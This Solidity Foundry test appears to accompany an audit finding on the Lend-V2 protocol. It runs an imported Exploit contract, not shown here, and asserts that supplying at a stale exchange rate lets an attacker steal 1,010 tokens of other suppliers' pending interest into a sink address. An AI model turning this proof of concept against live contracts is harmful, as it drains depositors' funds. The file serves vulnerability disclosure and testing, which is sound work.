// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, CoreRouter, LToken, LendStorage, MiniToken} from "./58378-lend-supplying-uses-an-outdated-exchange-rate.sol";

// Lend-V2 H-9 (finding 58378): CoreRouter.supply credits lTokens using the STALE
// exchangeRateStored() (ignores pending interest) instead of exchangeRateCurrent().
// An attacker supplying during pending interest is over-credited and, on redeem,
// steals the pending interest of prior suppliers while leaving the market insolvent.
contract Finding58378Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_outdatedExchangeRate_overCreditsAndSteals() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("lTokens credited to attacker", e.recordedCredit());
        emit log_named_uint("lTokens actually minted", e.actualMinted());
        emit log_named_uint("underlying stolen (net)", e.netStolen());
        emit log_named_uint("router lToken balance", e.routerLtokens());
        emit log_named_uint("Alice recorded backing", e.aliceRecorded());

        // Supplier is credited more lTokens than the market minted for the deposit.
        assertEq(e.recordedCredit(), 101_000 ether, "attacker credited full stale-rate amount");
        assertEq(e.actualMinted(), 100_000 ether, "market only minted at the current rate");
        assertGt(e.recordedCredit(), e.actualMinted(), "over-credit from stale rate");

        // Attacker extracted 1,010e18 underlying it never deposited (theft).
        assertEq(e.netStolen(), 1_010 ether, "attacker stole the pending interest");

        // Market is insolvent by exactly the phantom credit: Alice cannot fully redeem.
        assertLt(e.routerLtokens(), e.aliceRecorded(), "market backing < recorded investment");
        assertEq(e.aliceRecorded() - e.routerLtokens(), 1_000 ether, "1000e18 lTokens of backing stolen");

        // Harm magnitude is measurable on the drained token at the fixed sink.
        MiniToken token = e.token();
        assertEq(token.balanceOf(SINK), 1_010 ether, "sink holds the realized theft");
    }
}
